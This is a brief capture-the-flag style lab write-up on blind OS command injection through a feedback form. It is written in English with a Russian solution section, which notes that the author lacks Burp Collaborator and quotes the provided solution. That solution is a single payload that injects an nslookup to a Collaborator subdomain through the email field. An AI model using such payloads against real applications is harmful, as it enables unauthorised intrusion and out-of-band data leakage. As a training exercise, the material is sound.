# Blind OS command injection with out-of-band interaction
PRACTITIONER

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Решение
Коллаборатора в community edition нет, а лицензия professional на год стоит $449.00, так что посмотрел в предлагаемое решение:

`email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`

Если бы в лабе не было ограничения на доступ к сторонним доменам, сделал бы со своим собственным.
